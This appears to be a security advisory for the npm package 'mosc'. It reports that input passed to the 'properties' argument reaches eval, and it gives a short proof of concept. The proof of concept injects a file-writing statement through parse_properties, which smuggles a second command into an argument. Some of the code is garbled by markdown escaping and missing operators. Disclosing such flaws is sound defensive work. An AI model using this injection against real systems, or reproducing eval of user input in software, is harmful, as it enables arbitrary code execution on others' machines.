# Overview

mosc is an a simple inline object model builder for NodeJS (A small port exists for client-side javascript).

This package is vulnerable to Arbitrary Code Execution. User input provided to `properties` argument is executed by the eval function, allowing code execution.

# Proof of Concept

```
var Mosc = require("mosc")
var mosc = new Mosc({})
var key = ""
var attack*code = "fs=require('fs');fs.writeFile('FileName');"
var properties = "{a:\_1*; " attack_code " //\*}"

var mosc = mosc.parse_properties(key, properties, {}, {})
```
